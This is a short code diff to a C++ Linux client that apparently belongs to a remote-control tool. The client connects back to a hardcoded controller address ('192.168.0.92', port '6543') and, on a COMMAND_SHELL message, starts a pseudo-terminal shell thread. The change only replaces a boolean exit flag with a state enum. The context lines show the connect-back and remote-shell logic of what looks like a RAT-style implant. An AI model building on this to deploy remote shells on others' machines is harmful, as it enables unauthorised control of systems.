@@ -23,7 +23,7 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength);
 CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "192.168.0.92", "6543", CLIENT_TYPE_LINUX};
 
 // 全局状态
-BOOL g_bExit = FALSE;
+State g_bExit = S_CLIENT_NORMAL;
 
 // 伪终端处理类：继承自IOCPManager.
 class PTYHandler : public IOCPManager {
@@ -131,7 +131,7 @@ void *ShellworkingThread(void *param){
         BYTE bToken = TOKEN_SHELL_START;
         ClientObject->Send2Server((char*)&bToken, 1);
         Mprintf(">>> ShellworkingThread [%p] Send: TOKEN_SHELL_START\n", ClientObject);
-        while (ClientObject->IsRunning() && ClientObject->IsConnected() && !g_bExit)
+        while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL==g_bExit)
             Sleep(1000);
 
         delete handler;
@@ -147,7 +147,7 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength) {
 
     if (szBuffer[0] == COMMAND_BYE) {
         Mprintf("*** [%p] Received Bye-Bye command ***\n", user);
-        g_bExit = TRUE;
+        g_bExit = S_CLIENT_EXIT;
     }else if (szBuffer[0] == COMMAND_SHELL){
         pthread_t id = 0;
         HANDLE m_hWorkThread = (HANDLE)pthread_create(&id, nullptr, ShellworkingThread, nullptr);
@@ -235,7 +235,7 @@ int main() {
 
         do {
             Sleep(5000);
-        } while (ClientObject->IsRunning() && ClientObject->IsConnected() && !g_bExit);
+        } while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL==g_bExit);
     }
     
     delete ClientObject;
